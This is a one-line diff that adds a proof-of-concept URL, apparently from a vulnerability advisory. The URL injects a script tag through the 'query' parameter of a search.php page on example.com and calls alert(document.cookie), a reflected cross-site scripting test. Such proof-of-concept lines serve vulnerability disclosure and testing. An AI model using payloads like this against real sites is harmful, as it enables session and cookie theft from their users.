@@ -1,0 +1,1 @@
+http://www.example.com/search.php?submit_query=yes&amp;query=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;titlesearch=Search
